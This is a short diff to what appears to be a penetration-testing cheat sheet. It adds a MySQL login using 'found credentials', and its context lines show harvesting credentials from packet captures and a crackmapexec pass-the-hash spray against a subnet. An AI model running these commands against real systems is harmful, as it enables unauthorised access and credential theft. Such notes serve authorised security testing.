@@ -276,6 +276,9 @@ PHP:
 - run wireshark, save dump --> `./Pcredz -f dump.pcap`  
   or: `sudo ./net-creds.py -p dump.pcap` 
 
+### MySQL command line
+- using found credentials:   
+  ` mysql -uroot -p<pass> -e 'show databases;'`   
 ## crackmapexec
 - "hash spraying" (in this case with local administrator)  
    `cme smb 172.16.1.0/24 -u Administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth` 
